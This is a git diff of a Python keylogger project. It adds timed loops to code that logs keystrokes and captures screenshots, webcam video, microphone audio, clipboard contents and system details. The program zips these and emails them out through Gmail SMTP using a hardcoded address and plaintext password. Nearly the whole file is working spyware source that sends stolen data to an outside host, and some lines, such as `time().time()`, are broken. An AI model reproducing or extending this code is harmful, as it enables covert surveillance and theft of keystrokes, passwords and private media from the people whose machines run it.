@@ -1,13 +1,13 @@
 from pynput.keyboard import Listener, Key
 
-#Email Library
+# Email Library
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
 import smtplib
 
-#Everything Else
+# Everything Else
 import win32clipboard
 import socket
 import platform
@@ -35,15 +35,23 @@ video_file = r"\recording.avi"
 # email credentials
 email_address = "keyloggerproject4@gmail.com"
 password = "Keylogger12345!"
-to_address = "keyloggerproject4@gmail.com"
+destination_address = "keyloggerproject4@gmail.com"
 
 # finds path to keylogger
 path = os.path.dirname("keylogger.py")
 email_folder = path + r"\keylogger\email"
 email_folder_zip = path + r"\keylogger\email.zip"
 
+# timer variables
+iteration_number = 0
+iteration_end = 5
+currentTime = time.time()
+copyTime = time.time() + 30
+captureTime = time.time() + 60
+sendingTime = time.time() + 120
 
-def send_email(file_path, attachment, to_address):
+
+def send_email(filepath, attachment, to_address):
 
     from_address = email_address
 
@@ -59,7 +67,7 @@ def send_email(file_path, attachment, to_address):
 
     msg.attach(MIMEText(body, 'plain'))
 
-    filename = file_path
+    filename = filepath
     attachment = open(attachment, 'rb')
 
     p = MIMEBase('application', 'zip')
@@ -181,6 +189,7 @@ def webcam():
 
     cap.release()
     out.release()
+    print("recording closed")
     cv2.destroyAllWindows()
 
 
@@ -198,49 +207,66 @@ def zip_folder(filename, filename2, filename3, filename4, filename5, filename6):
         print("zip file not created")
 
 
-webcam()
-screenshot()
-microphone()
-copy_clipboard()
-computer_information()
-zip_folder(email_folder + log_file, email_folder + system_file, email_folder + clipboard_file, email_folder + audio_file, email_folder + screenshot_file, email_folder + video_file)
-send_email(log_file, email_folder_zip, to_address)
-print("log was successfully archived")
-
-# logger methods
-count = 0
-keys = []
+#   logger methods
 
 
-def on_press(key):
-    global keys, count
-
-    print(key)
-    keys.append(key)
-    count += 1
-
-    if count >= 1:
-        count - 0
-        write_file(keys)
-        keys = []
+while iteration_number < iteration_end:
+    count = 0
+    keys = []
 
 
-def write_file(keys):
-    with open(file_path + log_file, "a") as f:
-        for key in keys:
-            k = str(key).replace(",", " ")
-            if k.find("space") > 0:
-                f.write('\n')
-                f.close()
-            elif k.find("Key") == -1:
-                f.write(k)
-                f.close()
+    def on_press(key):
+        global keys, count, currentTime
+
+        print(key)
+        keys.append(key)
+        count += 1
+        currentTime = time.time()
+
+        if count >= 1:
+            count = 0
+            write_file(keys)
+            keys = []
 
 
-def on_release(key):
-    if key == Key.esc:
-        return False
+    def write_file(keys):
+        with open(file_path + log_file, "a") as f:
+            for key in keys:
+                k = str(key).replace(",", " ")
+                if k.find("space") > 0:
+                    f.write('\n' + time().time())
+                    f.close()
+                elif k.find("Key") == -1:
+                    f.write(k)
+                    f.close()
 
 
-with Listener(on_press=on_press, on_release=on_release) as listener:
-    listener.join()
+    def on_release(key):
+        if key == Key.esc:
+            return False
+        if currentTime > sendingTime:
+            return False
+
+    with Listener(on_press=on_press, on_release=on_release) as listener:
+        listener.join()
+
+    if currentTime > captureTime:
+        screenshot()
+        webcam()
+        microphone()
+        print("recording")
+
+    # close the other features - above only for keylogs
+    if currentTime > copyTime:
+        copy_clipboard()
+        computer_information()
+        print("clip and pc info copied")
+
+        # stops our keylogger after certain amount of iterations
+        iteration_number += 1
+
+    if currentTime > sendingTime:
+        zip_folder(email_folder + log_file, email_folder + system_file, email_folder + clipboard_file,
+                   email_folder + audio_file, email_folder + screenshot_file, email_folder + video_file)
+        send_email(log_file, email_folder_zip, destination_address)
+        print("log was successfully archived")
